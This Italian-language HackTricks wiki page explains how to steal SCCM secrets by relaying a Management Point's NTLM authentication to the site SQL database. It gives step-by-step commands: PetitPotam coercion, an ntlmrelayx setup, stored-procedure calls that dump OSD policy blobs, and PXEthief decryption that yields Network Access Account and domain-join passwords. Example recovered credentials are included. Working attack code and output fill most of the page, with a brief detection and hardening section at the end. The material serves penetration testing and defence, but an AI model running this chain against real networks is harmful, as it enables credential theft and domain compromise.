# Estrazione dei segreti della politica OSD tramite NTLM Relay del Punto di Gestione SCCM a SQL

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Costringendo un **Punto di Gestione (MP) di System Center Configuration Manager (SCCM)** ad autenticarsi tramite SMB/RPC e **rilasciando** quel conto macchina NTLM al **database del sito (MSSQL)** si ottengono diritti `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli ti consentono di chiamare un insieme di procedure memorizzate che espongono i blob delle politiche di **Distribuzione del Sistema Operativo (OSD)** (credenziali dell'Account di Accesso alla Rete, variabili della Sequenza di Attività, ecc.). I blob sono codificati/encriptati in esadecimale ma possono essere decodificati e decrittografati con **PXEthief**, rivelando segreti in chiaro.

Catena ad alto livello:
1. Scoprire MP & DB del sito ↦ endpoint HTTP non autenticato `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Avviare `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Costringere MP utilizzando **PetitPotam**, PrinterBug, DFSCoerce, ecc.
4. Attraverso il proxy SOCKS connettersi con `mssqlclient.py -windows-auth` come l'account rilasciato **<DOMAIN>\\<MP-host>$**.
5. Eseguire:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (o `MP_GetPolicyBodyAfterAuthorization`)
6. Rimuovere `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Segreti come `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, ecc. vengono recuperati senza toccare PXE o client.

---

## 1. Enumerazione degli endpoint MP non autenticati
L'estensione ISAPI MP **GetAuth.dll** espone diversi parametri che non richiedono autenticazione (a meno che il sito non sia solo PKI):

| Parametro | Scopo |
|-----------|-------|
| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del sito + GUID dei dispositivi **Tutti i Computer Sconosciuti** *x86* / *x64*. |
| `MPLIST` | Elenca ogni Punto di Gestione nel sito. |
| `SITESIGNCERT` | Restituisce il certificato di firma del Sito Primario (identifica il server del sito senza LDAP). |

Prendi i GUID che fungeranno da **clientID** per le query DB successive:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Trasmettere l'account macchina MP a MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quando la coercizione si attiva, dovresti vedere qualcosa del genere:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificare le politiche OSD tramite procedure memorizzate
Connettersi tramite il proxy SOCKS (porta 1080 per impostazione predefinita):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Passa al DB **CM_<SiteCode>** (usa il codice sito di 3 cifre, ad esempio `CM_001`).

### 3.1 Trova GUID di Computer Sconosciuti (opzionale)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Elenca le politiche assegnate
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Ogni riga contiene `PolicyAssignmentID`, `Body` (esadecimale), `PolicyID`, `PolicyVersion`.

Concentrati sulle politiche:
* **NAAConfig**  – credenziali dell'Account di Accesso alla Rete
* **TS_Sequence** – variabili della Sequenza di Attività (OSDJoinAccount/Password)
* **CollectionSettings** – può contenere account di esecuzione

### 3.3  Recupera il corpo completo
Se hai già `PolicyID` e `PolicyVersion`, puoi saltare il requisito del clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: In SSMS aumentare "Caratteri Massimi Recuperati" (>65535) o il blob verrà troncato.

---

## 4. Decodifica e decripta il blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Esempio di segreti recuperati:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Ruoli e procedure SQL rilevanti
Al momento del relay, il login è mappato a:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Questi ruoli espongono dozzine di permessi EXEC, i principali utilizzati in questo attacco sono:

| Procedura Memorizzata | Scopo |
|-----------------------|-------|
| `MP_GetMachinePolicyAssignments` | Elenca le politiche applicate a un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Restituisce il corpo completo della politica. |
| `MP_GetListOfMPsInSiteOSD` | Restituito dal percorso `MPKEYINFORMATIONMEDIA`. |

Puoi ispezionare l'elenco completo con:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Rilevamento e Indurimento
1. **Monitora gli accessi MP** – qualsiasi account computer MP che accede da un IP che non è il suo host ≈ relay.
2. Abilita **Protezione Estesa per l'Autenticazione (EPA)** sul database del sito (`PREVENT-14`).
3. Disabilita NTLM non utilizzati, applica la firma SMB, limita RPC (
stesse mitigazioni utilizzate contro `PetitPotam`/`PrinterBug`).
4. Indurire la comunicazione MP ↔ DB con IPSec / mutual-TLS.

---

## Vedi anche
* Fondamenti del relay NTLM:
{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuso di MSSQL e post-exploitation:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Riferimenti
- [Vorrei parlare con il tuo manager: Rubare segreti con i Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Gestore di Misconfigurazioni – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
